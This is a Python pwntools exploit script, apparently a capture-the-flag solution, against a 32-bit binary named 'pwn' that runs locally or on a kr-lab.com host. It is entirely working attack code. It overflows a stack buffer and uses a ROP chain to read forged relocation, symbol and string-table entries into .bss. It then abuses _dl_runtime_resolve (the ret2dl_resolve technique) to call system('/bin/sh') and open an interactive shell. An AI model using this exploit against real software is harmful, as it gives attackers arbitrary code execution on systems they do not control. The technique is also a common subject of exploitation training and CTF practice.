#!/usr/bin/env python
# coding=utf-8

from pwn import *
debug = 1
local =1
if local:
    a=process("./pwn")
else:
    a=remote("da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com","33865")

elf=ELF("./pwn")

read_plt=elf.plt["read"]
rel_plt_addr=0x804833c
dynsym_addr=0x80481dc
dynstr_addr=0x804827c
plt0_addr=0x8048380
pop3_ret=0x080485d9
bss_addr=elf.bss()+0x20

fake_rel_plt_addr=bss_addr

arg_offset=fake_rel_plt_addr - rel_plt_addr#dl_reslove(linkmap,arg_offset)

fake_dynsym_addr=fake_rel_plt_addr + 0x8   #fake_dynsym address

align=16-(fake_dynsym_addr-dynsym_addr)%16  #align
fake_dynsym_addr+=align                 

r_info=(((fake_dynsym_addr-dynsym_addr)/16)<<8)|0x7 #rel_plt's r_info

fake_dynstr_addr=fake_dynsym_addr+16   
sh_addr=fake_dynstr_addr + 7
offset=fake_dynstr_addr-dynstr_addr

payload = 'A'*44
payload += p32(read_plt)
payload += p32(pop3_ret)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(0x100)
payload += p32(plt0_addr)    # jump to _dl_runtime_resolve
payload += p32(arg_offset)   # fake reloc_arg
payload += p32(read_plt)
payload += p32(0)
payload += p32(sh_addr)
payload += p8(0)*(0x100-len(payload))
a.send(payload)

pause()

payload=p32(elf.got["read"])#fake_rel_plt
payload+=p32(r_info)
payload+='A'*align     #padding
payload+=p32(offset)+p32(0)+p32(0)+p32(0x12) #fake dynsym
payload+="system\x00" #fake dynstr
payload+="/bin/sh\x00"
a.sendline(payload)
a.interactive()

